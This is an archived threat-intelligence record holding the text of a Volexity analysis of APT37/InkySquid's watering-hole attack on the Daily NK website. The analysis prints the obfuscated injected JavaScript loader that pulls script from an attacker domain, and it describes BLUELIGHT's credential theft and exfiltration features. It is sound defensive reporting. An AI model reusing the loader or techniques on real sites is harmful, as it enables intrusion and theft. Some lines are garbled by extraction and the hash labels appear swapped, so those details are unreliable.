{
    "id": "4dfc8fee-6c15-46b9-8a46-0c1f1292d7bd",
    "created_at": "2023-01-12T15:10:28.364823Z",
    "updated_at": "2025-03-27T02:16:37.075553Z",
    "deleted_at": null,
    "sha1_hash": "7f95110e388384c8a9afc94ff9e24573b2c3afd9",
    "title": "2021-08-17 - North Korean APT37 - InkySquid Infects Victims Using Browser Exploits",
    "authors": "",
    "file_creation_date": "2022-05-27T22:15:58Z",
    "file_modification_date": "2022-05-27T22:15:58Z",
    "file_size": 817884,
    "plain_text": "# North Korean APT InkySquid Infects Victims Using Browser Exploits\n\n**[volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/](https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/)**\n\nAugust 17, 2021\n\nby Damien Cash, Josh Grunzweig, Matthew Meltzer, Steven Adair, Thomas Lancaster\n\nVolexity recently investigated a strategic web compromise (SWC) of the website of the Daily NK (www.dailynk[.]com), a South Korean online\nnewspaper that focuses on issues relating to North Korea. Malicious code on the Daily NK website was observed from at least late March 2021\nuntil early June 2021.\n\nThis post provides details on the different exploits used in the SWC, as well as the payload used, which Volexity calls BLUELIGHT. Volexity\nattributes the activity described in this post to a threat actor Volexity refers to as InkySquid, which broadly corresponds to activity known\npublicly under the monikers ScarCruft and APT37.\n\n## SWC Activity\n\nIn April 2021, through its network security monitoring on a customer network, Volexity identified suspicious code being loaded via\nwww.dailynk[.]com to malicious subdomains of jquery[.]services. Examples of URLs observed loading malicious code include the following:\n\nhxxps://www.dailynk[.]com/wp-includes/js/jquery/jquery.min.js?ver=3.5.1\n\nhxxps://www.dailynk[.]com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2\n\nThese URLs lead to legitimate files used as part of the normal function of the Daily NK website; however, their contents were modified by the\nattacker to include code redirecting users to load malicious JavaScript from the attacker-owned domain jquery[.]services. The attackerincluded code was only added for short periods of time and was swiftly removed, making identification of this activity difficult as the malicious\ncontent was not always available.\n\n## CVE-2020-1380\n\n[The first time Volexity was able to identify malicious code being returned, the attacker was observed using CVE-2020-1380, an exploit for](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1380)\nInternet Explorer. The attacker added a single line of code to the following legitimate file on Daily NK:\n\nhxxps://www.dailynk[.]com/wp-includes/js/jquery/jquery.min.js?ver=3.5.1\n\nThe line of obfuscated code added to DailyNK was as follows:\n\n\n-----\n\nu ct o g a (){ a\ne=document.createElement(\"script\");e.src=fecet(\"w6625I>>7x=y37t4;=5t48xrt5>4t52105x8t<t:6t0s=/x0=y5\",15),document.head&&document.h\nvdgie(){const e=window.navigator.userAgent,t=e.indexOf(\"rv:11.0 \"),i=e.indexOf(\"Trident/\");return t>0||i>0}vdgie()&&vgrai();\n\nThe effect of this is that if a user visited Daily NK using Internet Explorer, then a page would load an additional JavaScript file from the\nfollowing URL:\n\nhxxps://ui.jquery[.]services/responsive-extend.min.js\n\nWhen requested, with the correct Internet Explorer User-Agent, this host would serve additional obfuscated JavaScript code. As with the initial\n[redirect, the attacker chose to bury their malicious code amongst legitimate code. In this particular case, the attacker used the \"bPopUp\"](https://cdnjs.cloudflare.com/ajax/libs/bPopup/0.11.0/jquery.bpopup.min.js)\nJavaScript library alongside their own code. This decision has two effects:\n\n1. Anyone manually analyzing the JavaScript may dismiss it as legitimate, since the majority of the included code is benign.\n2. Automated solutions used to identify malicious JavaScript may misidentify the code as benign, since large sections match known\n\nlegitimate library content and use code patterns seen in benign JavaScript.\n\nOne interesting aspect of the exploit code the attacker includes is that many of the strings are obfuscated within variables designed to look like\nlegitimate SVG content. An example of the attacker hiding these strings is given in Figure 1:\n\n_Figure 1. Obfuscated strings within the falsified SVG variable_\n\nIn order to decrypt the strings, the following steps are performed:\n\n1. Split the data contained within the “d” attribute of the “path” variable via the “M43.2” string.\n2. Take each element in the split data and split once again on space characters, resulting in a list of numbers.\n3. Convert each resulting number to an integer.\n4. If this integer is greater than 30, subtract 17 and append it to the resulting string. If the integer is 30 or less, discard it.\n\n[A Python script to decode these SVG variables is provided on Volexity's GitHub page here.](https://github.com/volexity/threat-intel/blob/main/2021/2021-08-17%20-%20InkySquid%20Part%201/scripts/decode_svg.py)\n\nIn total, three fake SVG objects were used. Once the strings from these objects are substituted into the remaining JavaScript, identifying the\nexploit became easier. A key segment of the resulting code is given in Figure 2:\n\n\n-----\n\n_Figure 2. Implementation of CVE-2020-1380_\n\n[This code corresponds to publicly available proof-of-concept (PoC) code for CVE-2020-1380 that has been well documented by TrendMicro.](https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html)\n\nFollowing successful exploitation, the JavaScript decrypts a final SVG variable using the same technique described previously. The resulting\nblob contains a hex-encoded representation of a Cobalt Strike stager, which is decoded and executed. In this case, the URLs from where it\nexpected to download additional shellcode were as follows:\n\nhxxps://ui.jquery[.]services/swipeout.min.js\n\nhxxps://ui.jquery[.]services/swipeout.min.css\n\nhxxps://ui.jquery[.]services/slider.min.css\n\n## CVE-2021-26411\n\n[On another occasion, CVE-2021-26411 was used, which is another exploit targeting Internet Explorer and legacy versions of Microsoft Edge.](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26411)\nThe redirect code was set up in the same way as CVE-2020-1380, the only difference being the exploit code used. The key part of the exploit\n[code used is given in Figures 3 and 4. It was likely a direct implementation of the PoC code posted here by Korean security company Enki.](https://enki.co.kr/blog/2021/02/04/ie_0day.html)\n\n\n-----\n\n_Figure 3. Key exploit code used by the attackers_\n\n_Figure 4. PoC code released on the Enki security blog_\n\nAs with the CVE-2020-1380 example, the attacker made use of encoded content stored in SVG tags to store both key strings and their initial\npayload. The initial command-and-control (C2) urls were the same as those observed in the CVE-2020-1380 case.\n\n## BLUELIGHT\n\nOn another occasion, the attacker used a different subdomain of jquery[.]services to host a new and novel malware family. The file was hosted\nat the following location:\n```\n   hxxps://storage.jquery[.]services/log/history\n\n```\nThe \"history\" file was an XOR-encoded (0xCF) copy of a custom malware family that both the malware developer and Volexity refer to as\nBLUELIGHT. The moniker is derived from the PDB string observed in the malware:\n```\n   E:\\Development\\BACKDOOR\\ncov\\Release\\bluelight.pdb\n\n```\nIt is likely that BLUELIGHT is used as a secondary payload following successful delivery of Cobalt Strike, which was used as an initial payload\nin both exploitation cases highlighted earlier in this report.\n\nThe file analyzed for this report had the following details:\n\n**Filename** history\n\n**SHA1** 9b86888a83dd0dd1c3a0929f1ea53b82\n\n**MD5** 558ce5e8c0b1b0a76b88db087f0c92f7a62716fe\n\n**SHA256** 5c430e2770b59cceba1f1587b34e686d586d2c8ba1908bb5d066a616466d2cc6\n\n**Notes** Shellcode with embedded PE.\n\nThe BLUELIGHT malware family uses different cloud providers to facilitate C2. This specific sample leveraged the Microsoft Graph API for its\nC2 operations. Upon start-up, BLUELIGHT performs an oauth2 token authentication using hard-coded parameters. Once the client is\n[authenticated, BLUELIGHT creates a new subdirectory in the OneDrive appfolder and populates it with several subdirectories used by the C2](https://docs.microsoft.com/en-us/onedrive/developer/rest-api/concepts/special-folders-appfolder?view=odsp-graph-online)\nprotocol. The following subdirectory names were used:\n\nlogo\nnormal\nbackground\ntheme\nround\n\n\n-----\n\nO ce t e o de a d subd ecto es a e set up, eco a ssa ce data s gat e ed co ta g t e o o g o at o, o atted as a JSO\nobject:\n\nUsername\nComputer name\nOS version\nWeb IP\nLocal IP of default interface\nLocalTime\nWhether the implant binary is 32 or 64 bit\nProcess SID authority level\nProcess filename\nList of AV products installed\nWhether the infected machine has VM tools running\n\nThe data is XOR encoded into a binary blob and uploaded. All further reconnaissance and command response data is similarly encoded. This\nversion of the implant used the \".jpg\" extension for nearly all files uploaded regardless of their content, with different subdirectories and base\nfilenames indicating different types of command data. The reconnaissance data, for instance, is uploaded to the \"logo/title.jpg\" path.\n\nThe main C2 loop starts after the initial upload of the reconnaissance data, iterating once every approximately 30 seconds. For the first five\nminutes, each iteration will capture a screenshot of the display and upload it to the \"normal\" subdirectory with an encoded timestamp as the\nfilename. After the first five minutes, the screenshot uploads once every five minutes.\n\nWith every iteration, the client will also query for new commands by enumerating the children of the \"background\" subdirectory. The name of\nthe file indicates the command to perform, with the contents of the file providing further command-specific information. The following\ncommands are supported:\n\nExecute downloaded shellcode.\nDownload and launch an executable, then upload program output.\nHarvest cookies and a password database for supported browsers.\n[— Supports: Win7 IE, Win10 IE, Edge, Chrome, and Naver Whale](https://whale.naver.com/en/)\nRecursively search a path and upload file metadata (timestamps, size, and full path).\nSpawn a thread to recursively search a path and upload files as a ZIP archive.\nTerminate the file upload thread.\nUninstall the implant.\n\nCommand files are deleted after being processed. Result files for most commands are uploaded to the “round” directory; however, the ZIP\nupload uses the “theme” subdirectory.\n\n## Conclusion\n\nWhile SWCs are not as popular as they once were, they continue to be a weapon in the arsenal of many attackers. The use of recently\npatched exploits for Internet Explorer and Microsoft Edge will only work against a limited audience. Attackers will still have some success,\nhowever, and have a good chance of avoiding detection based on the following attributes of their attack:\n\nClever disguise of exploit code amongst legitimate code, making it harder to identify\nOnly allowing exploitable user-agents access to the exploit code, making it difficult to identify at scale (such as through automated\nscanning of websites)\nUse of innovative custom malware, such as BLUELIGHT, after successful exploitation using C2 mechanisms which are unlikely to be\ndetected by many solutions\n\nHow is this activity attributed to InkySquid (aka ScarCruft, APT37)? This will be explained further in a follow-up post, so stay tuned!\n\n### IoCs & Signatures\n\n[Related IoCs and signatures to this post are available on Volexity's GitHub page here.](https://github.com/volexity/threat-intel/tree/main/2021/2021-08-17%20-%20InkySquid%20Part%201/indicators)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-08-17 - North Korean APT37 - InkySquid Infects Victims Using Browser Exploits.pdf"
    ],
    "report_names": [
        "2021-08-17 - North Korean APT37 - InkySquid Infects Victims Using Browser Exploits.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "bbe36874-34b7-4bfb-b38b-84a00b07042e",
            "created_at": "2022-10-25T15:50:23.375277Z",
            "updated_at": "2025-03-27T02:00:55.457787Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "APT37",
                "InkySquid",
                "ScarCruft",
                "Group123",
                "TEMP.Reaper",
                "Ricochet Chollima"
            ],
            "source_name": "MITRE:APT37",
            "tools": [
                "BLUELIGHT",
                "CORALDECK",
                "KARAE",
                "SLOWDRIFT",
                "ROKRAT",
                "SHUTTERSPEED",
                "POORAIM",
                "HAPPYWORK",
                "Final1stspy",
                "Cobalt Strike",
                "NavRAT",
                "DOGCALL",
                "WINERACK"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "552ff939-52c3-421b-b6c9-749cbc21a794",
            "created_at": "2023-01-06T13:46:38.742547Z",
            "updated_at": "2025-03-27T02:00:02.906537Z",
            "deleted_at": null,
            "main_name": "APT37",
            "aliases": [
                "ScarCruft",
                "Venus 121",
                "Moldy Pisces",
                "Group 123",
                "APT 37",
                "Group123",
                "Operation Daybreak",
                "Operation Erebus",
                "Red Eyes",
                "TA-RedAnt",
                "InkySquid",
                "Reaper Group",
                "Ricochet Chollima",
                "ATK4",
                "G0067"
            ],
            "source_name": "MISPGALAXY:APT37",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f0bccc3d-ad77-49c4-8dfd-8a8a8d6fba26",
            "created_at": "2024-05-01T02:03:08.134022Z",
            "updated_at": "2025-03-27T02:05:17.415028Z",
            "deleted_at": null,
            "main_name": "NICKEL FOXCROFT",
            "aliases": [
                "Group 123 ",
                "Moldy Pisces ",
                "RICOCHET CHOLLIMA ",
                "Reaper ",
                "ScarCruft ",
                "APT37 "
            ],
            "source_name": "Secureworks:NICKEL FOXCROFT",
            "tools": [
                "ROKRAT"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "9b02c527-5077-489e-9a80-5d88947fddab",
            "created_at": "2022-10-25T16:07:24.103499Z",
            "updated_at": "2025-03-27T02:02:10.108504Z",
            "deleted_at": null,
            "main_name": "Reaper",
            "aliases": [
                "APT 37",
                "ATK 4",
                "Cerium",
                "Crooked Pisces",
                "Geumseong121",
                "Group 123",
                "ITG10",
                "InkySquid",
                "Moldy Pisces",
                "Opal Sleet",
                "Operation Are You Happy?",
                "Operation Battle Cruiser",
                "Operation Black Banner",
                "Operation Daybreak",
                "Operation Dragon messenger",
                "Operation Erebus",
                "Operation Evil New Year",
                "Operation Evil New Year 2018",
                "Operation Fractured Block",
                "Operation Fractured Statue",
                "Operation FreeMilk",
                "Operation Golden Bird",
                "Operation Golden Time",
                "Operation High Expert",
                "Operation Holiday Wiper",
                "Operation Korean Sword",
                "Operation North Korean Human Right",
                "Operation Onezero",
                "Operation Rocket Man",
                "Operation SHROUDED#SLEEP",
                "Operation STARK#MULE",
                "Operation STIFF#BIZON",
                "Operation Spy Cloud",
                "Operation Star Cruiser",
                "Osmium",
                "Red Eyes",
                "Ricochet Chollima",
                "Ruby Sleet",
                "ScarCruft",
                "TA-RedAnt",
                "TEMP.Reaper",
                "Venus 121"
            ],
            "source_name": "ETDA:Reaper",
            "tools": [
                "Agentemis",
                "BLUELIGHT",
                "Backdoor.APT.POORAIM",
                "CARROTBALL",
                "CARROTBAT",
                "CORALDECK",
                "Cobalt Strike",
                "CobaltStrike",
                "DOGCALL",
                "Erebus",
                "Exploit.APT.RICECURRY",
                "Final1stSpy",
                "Freenki Loader",
                "GELCAPSULE",
                "GOLDBACKDOOR",
                "GreezeBackdoor",
                "HAPPYWORK",
                "JinhoSpy",
                "KARAE",
                "KevDroid",
                "Konni",
                "MILKDROP",
                "N1stAgent",
                "NavRAT",
                "Nokki",
                "Oceansalt",
                "POORAIM",
                "PoohMilk",
                "PoohMilk Loader",
                "RICECURRY",
                "RUHAPPY",
                "RokRAT",
                "SHUTTERSPEED",
                "SLOWDRIFT",
                "SOUNDWAVE",
                "SYSCON",
                "Sanny",
                "ScarCruft",
                "StarCruft",
                "Syscon",
                "VeilShell",
                "WINERACK",
                "ZUMKONG",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536228,
    "ts_updated_at": 1743041797,
    "ts_creation_date": 1653689758,
    "ts_modification_date": 1653689758,
    "files": {
        "pdf": "https://archive.orkl.eu/7f95110e388384c8a9afc94ff9e24573b2c3afd9.pdf",
        "text": "https://archive.orkl.eu/7f95110e388384c8a9afc94ff9e24573b2c3afd9.txt",
        "img": "https://archive.orkl.eu/7f95110e388384c8a9afc94ff9e24573b2c3afd9.jpg"
    }
}